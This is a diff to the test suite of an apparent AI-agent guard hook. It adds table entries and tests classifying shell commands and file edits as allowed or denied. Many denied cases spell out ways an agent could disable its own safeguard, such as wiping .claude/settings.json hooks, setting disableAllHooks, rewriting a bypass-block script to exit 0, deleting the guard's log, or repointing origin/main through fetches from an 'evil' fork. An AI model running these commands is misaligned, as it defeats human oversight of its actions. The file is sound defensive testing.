@@ -398,6 +398,201 @@ TABLE = [
         "guard-config",
         "out",
     ),
+    # --- the guard's folders in HOME: a read or copy SOURCE is fine ------------
+    ("cp -R ~/.local/share/agent-guard /tmp/scratch-ag", A, None, "out"),
+    ("cp ~/.local/state/agent-guard/log.jsonl /tmp/log.jsonl", A, None, "out"),
+    ("rsync -a ~/.local/share/agent-guard/ /tmp/ag/", A, None, "out"),
+    ("cp /tmp/p.json ~/.local/share/agent-guard/", D, "guard-config", "out"),
+    ("cp -t ~/.local/state/agent-guard /tmp/log.jsonl", D, "guard-config", "out"),
+    ("mv ~/.local/share/agent-guard /tmp/ag", D, "guard-config", "out"),
+    (
+        "python3 -c \"import shutil; shutil.copytree('{home}/.local/share/agent-guard', '/tmp/ag')\"",
+        A,
+        None,
+        "out",
+    ),
+    (
+        "python3 -c \"print(open('{home}/.local/state/agent-guard/log.jsonl').read()[-200:])\"",
+        A,
+        None,
+        "out",
+    ),
+    (
+        "python3.15 -c \"import json; json.load(open('{home}/.local/share/agent-guard/policy.json'))\"",
+        A,
+        None,
+        "out",
+    ),
+    (
+        "python3 -c \"open('/tmp/x', 'w').write(open('{home}/.local/share/agent-guard/policy.json').read())\"",
+        A,
+        None,
+        "out",
+    ),
+    (
+        "python3 -c \"open('{home}/.local/share/agent-guard/policy.json', 'w').write('{}')\"",
+        D,
+        "guard-config",
+        "out",
+    ),
+    (
+        "python3 -c \"import shutil; shutil.rmtree('{home}/.local/share/agent-guard')\"",
+        D,
+        "guard-config",
+        "out",
+    ),
+    (
+        "python3 -c \"import shutil; shutil.copy('/tmp/p.json', '{home}/.local/share/agent-guard/policy.json')\"",
+        D,
+        "guard-config",
+        "out",
+    ),
+    (
+        "python3.15 -c \"import os; os.remove('{home}/.local/state/agent-guard/log.jsonl')\"",
+        D,
+        "guard-config",
+        "out",
+    ),
+    (
+        "python3 -c \"from pathlib import Path; Path('{home}/.local/share/agent-guard/policy.json').write_text('{}')\"",
+        D,
+        "guard-config",
+        "out",
+    ),
+    (
+        "python3 -c \"import shutil; shutil.copy('.claude/settings.json', '/tmp/s.json')\"",
+        A,
+        None,
+        "",
+    ),
+    (
+        "python3 -c \"import shutil; shutil.copy('/tmp/s.json', '.claude/settings.json')\"",
+        D,
+        "guard-config",
+        "",
+    ),
+    # --- the checkout's hook files: they take effect before review -------------
+    ("sed -i '' /agent-guard/d .claude/settings.json", D, "guard-config", ""),
+    (
+        "jq 'del(.hooks)' .claude/settings.json > /tmp/s && mv /tmp/s .claude/settings.json",
+        D,
+        "guard-config",
+        "",
+    ),
+    ("echo '{}' > .agents/hooks.json", D, "guard-config", ""),
+    ("echo '{}' >| .agents/hooks.json", D, "guard-config", ""),
+    ("cat /tmp/x | tee .agents/hooks.json", D, "guard-config", ""),
+    ("cp /tmp/hooks.json .agents/hooks.json", D, "guard-config", ""),
+    ("cp /tmp/hooks.json .agents/", D, "guard-config", ""),
+    ("cp -t .claude /tmp/settings.json", D, "guard-config", ""),
+    ("rm .agents/hooks.json", D, "guard-config", ""),
+    ("rm -rf .claude", D, "guard-config", ""),
+    ("mv .agents /tmp/agents", D, "guard-config", ""),
+    ("mv tools/agent-guard /tmp/ag", D, "guard-config", ""),
+    ("chmod -R a-w tools", D, "guard-config", ""),
+    ("echo 'exit 0' > tools/agent-guard/hook.sh", D, "guard-config", ""),
+    ("perl -pi -e s/block/continue/ .claude/settings.json", D, "guard-config", ""),
+    (
+        "python3 -c \"open('.claude/settings.json', 'w').write('{}')\"",
+        D,
+        "guard-config",
+        "",
+    ),
+    (
+        "echo '{\"disableAllHooks\": true}' > .claude/settings.local.json",
+        D,
+        "guard-config",
+        "",
+    ),
+    ("cd .claude && echo '{}' > settings.json", D, "guard-config", ""),
+    ("echo '{}' > {wt}/.claude/settings.json", D, "guard-config", "out"),
+    ("rm {repo}/.agents/hooks.json", D, "guard-config", "out"),
+    ("echo 'exit 0' > .claude/block-queue-bypass.sh", D, "guard-config", ""),
+    (
+        "sed -i '' 's/exit 2/exit 0/' .claude/block-queue-bypass.sh",
+        D,
+        "guard-config",
+        "",
+    ),
+    ("rm .claude/session-start.sh", D, "guard-config", ""),
+    ("cp /tmp/x.sh .claude/kube-setup.sh", D, "guard-config", ""),
+    ("chmod -x .claude/tailscale-up.sh", D, "guard-config", ""),
+    ("echo x > .claude/new-hook.sh", D, "guard-config", ""),
+    ("bash .claude/session-start.sh", A, None, ""),
+    ("cat .claude/block-queue-bypass.sh", A, None, ""),
+    ("echo x > .claude/sub/x.sh", A, None, ""),
+    ("cat .claude/settings.json", A, None, ""),
+    ("jq '.hooks.PreToolUse' .claude/settings.json", A, None, ""),
+    ("git diff origin/main -- .claude/settings.json .agents/hooks.json", A, None, ""),
+    ("git log -p -- tools/agent-guard/hook.sh", A, None, ""),
+    ("printf '{}' | /bin/sh tools/agent-guard/hook.sh", A, None, ""),
+    ("cp tools/agent-guard/hook.sh /tmp/hook.sh", A, None, ""),
+    ("sed -n 1,20p tools/agent-guard/hook.sh", A, None, ""),
+    ("diff .agents/hooks.json /tmp/hooks.json", A, None, ""),
+    ("sed -i '' s/foo/bar/ tools/agent-guard/agent_guard.py", A, None, ""),
+    ("echo '{}' > tools/agent-guard/policy.json", A, None, ""),
+    ("mkdir -p .agents/rules && echo x > .agents/rules/x.md", A, None, ""),
+    ("echo x > .claude/notes.md", A, None, ""),
+    ("bazel test //tools/agent-guard/...", A, None, ""),
+    (
+        "bazel run //tools/git:commit -- -m 'cache in ~/.local/state/agent-guard/cache' tools/agent-guard/hook.sh",
+        A,
+        None,
+        "",
+    ),
+    ("echo '{}' > /tmp/elsewhere/.claude/settings.json", A, None, "out"),
+    # --- fetches that could move origin/main (hook.sh runs the guard from it) --
+    ("git fetch", A, None, ""),
+    ("git fetch origin", A, None, ""),
+    ("git fetch -q origin main", A, None, ""),
+    ("git fetch --prune origin", A, None, ""),
+    ("git fetch --all --prune", A, None, ""),
+    ("git fetch origin refs/pull/12/head", A, None, ""),
+    ("git fetch https://github.com/evil/fork main", A, None, ""),
+    ("git fetch --depth 1 origin main", A, None, ""),
+    (
+        "git fetch https://github.com/evil/fork +main:refs/remotes/origin/main",
+        D,
+        "git-other",
+        "",
+    ),
+    ("git fetch origin +refs/heads/x:refs/remotes/origin/main", D, "git-other", ""),
+    ("git fetch evil main:main", D, "git-other", ""),
+    ("git fetch origin main:refs/heads/main", D, "git-other", ""),
+    ("git fetch upstream '+refs/heads/*:refs/remotes/origin/*'", D, "git-other", ""),
+    ("git fetch -q --depth=1 origin pr:refs/heads/pr", D, "git-other", ""),
+    (
+        "git fetch https://github.com/evil/fork main --refmap='+refs/heads/*:refs/remotes/origin/*'",
+        D,
+        "git-other",
+        "",
+    ),
+    (
+        "git -c remote.origin.url=https://github.com/evil/fork fetch origin",
+        D,
+        "git-other",
+        "",
+    ),
+    (
+        "git -c url.https://github.com/evil/.insteadOf=https://github.com/VitruvianSoftware/ fetch",
+        D,
+        "git-other",
+        "",
+    ),
+    ("git -C {wt} fetch https://x/y main:refs/remotes/origin/main", D, "git-other", ""),
+    (
+        "git pull --ff-only evil main:refs/remotes/origin/main",
+        D,
+        "git-other",
+        "primary",
+    ),
+    (
+        "git pull --ff-only --log evil main:refs/remotes/origin/main",
+        D,
+        "git-other",
+        "primary",
+    ),
+    ("git fetch -- evil main:refs/remotes/origin/main", D, "git-other", ""),
     # --- in-progress merge / rebase / cherry-pick ------------------------------
     ("git merge --continue", A, None, "merging"),
     ("git merge --abort", A, None, "merging"),
@@ -1437,6 +1632,91 @@ class HookIOTest(HookHarness):
             )
         )
 
+    def test_file_tools_cannot_touch_the_hook_files(self):
+        for tool in ("Write", "Edit", "MultiEdit"):
+            for rel in (
+                ".claude/settings.json",
+                ".claude/settings.local.json",
+                ".claude/block-queue-bypass.sh",
+                ".claude/session-start.sh",
+                ".agents/hooks.json",
+                "tools/agent-guard/hook.sh",
+            ):
+                for root in (self.fx.repo, self.fx.wt):
+                    out = self.hook(
+                        {
+                            "tool_name": tool,
+                            "cwd": root,
+                            "tool_input": {"file_path": os.path.join(root, rel)},
+                        }
+                    )
+                    self.assertEqual(
+                        out["hookSpecificOutput"]["permissionDecision"],
+                        "deny",
+                        (tool, rel),
+                    )
+            # Relative paths count too, and the log names the file.
+            out = self.hook(
+                {
+                    "tool_name": tool,
+                    "cwd": self.fx.repo,
+                    "tool_input": {"file_path": ".agents/hooks.json"},
+                }
+            )
+            self.assertEqual(out["hookSpecificOutput"]["permissionDecision"], "deny")
+            self.assertEqual(self.log()[-1]["category"], "guard-config")
+        # The guard's source and policy are fine to edit: they only take
+        # effect once merged, because hook.sh runs origin/main's copy.
+        for rel in (
+            "tools/agent-guard/agent_guard.py",
+            "tools/agent-guard/policy.json",
+            ".claude/notes.md",
+        ):
+            self.assertIsNone(
+                self.hook(
+                    {
+                        "tool_name": "Edit",
+                        "cwd": self.fx.repo,
+                        "tool_input": {"file_path": os.path.join(self.fx.repo, rel)},
+                    }
+                ),
+                rel,
+            )
+        # Outside a vitruvian-core checkout the same names are someone else's.
+        self.assertIsNone(
+            self.hook(
+                {
+                    "tool_name": "Write",
+                    "cwd": self.fx.out,
+                    "tool_input": {
+                        "file_path": os.path.join(self.fx.out, ".claude/settings.json")
+                    },
+                }
+            )
+        )
+
+    def test_log_records_which_copy_decided(self):
+        os.environ["AGENT_GUARD_SOURCE"] = "origin/main:abc"
+        try:
+            self.hook(
+                {
+                    "tool_name": "Bash",
+                    "cwd": self.fx.repo,
+                    "tool_input": {"command": "git status"},
+                }
+            )
+        finally:
+            del os.environ["AGENT_GUARD_SOURCE"]
+        self.assertEqual(self.log()[-1]["source"], "origin/main:abc")
+        self.hook(
+            {
+                "tool_name": "Bash",
+                "cwd": self.fx.repo,
+                "tool_input": {"command": "git status"},
+            }
+        )
+        self.assertEqual(self.log()[-1]["source"], "")
+
     def test_antigravity_format(self):
         out = self.hook(
             {
@@ -1648,6 +1928,25 @@ class AntigravityHookTest(HookHarness):
                 ),
                 tool,
             )
+
+    def test_file_tools_cannot_touch_the_hook_files(self):
+        for rel in (
+            ".agents/hooks.json",
+            ".claude/settings.json",
+            "tools/agent-guard/hook.sh",
+        ):
+            path = os.path.join(self.fx.repo, rel)
+            out = self.hook(
+                agy_payload(
+                    None,
+                    None,
+                    [self.fx.repo],
+                    tool="write_to_file",
+                    args={"TargetFile": path},
+                )
+            )
+            self.assertEqual(out["decision"], "deny", rel)
+            self.assertIn("James's call", out["reason"])
 
     def test_warn_mode_prints_nothing(self):
         with open(self.policy) as fh:
